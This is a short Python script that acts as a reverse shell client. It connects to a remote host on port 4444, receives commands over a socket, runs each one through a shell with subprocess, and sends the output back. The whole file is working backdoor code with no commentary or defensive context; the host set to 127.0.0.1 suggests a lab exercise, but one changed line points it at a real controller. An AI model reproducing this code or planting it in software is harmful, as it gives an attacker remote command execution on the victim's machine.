import socket
import subprocess

REMOTE_HOST = '127.0.0.1'
REMOTE_PORT = 4444
client = socket.socket()
print("[-] Establishing Connection ...")
client.connect((REMOTE_HOST, REMOTE_PORT))
print("[-] Connected!")

while True:
    print("[-] Awaiting commands...")
    command = client.recv(1024)
    command = command.decode()
    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    output = op.stdout.read()
    output_error = op.stderr.read()
    print("[-] Sending response...")
    client.send(output + output_error)
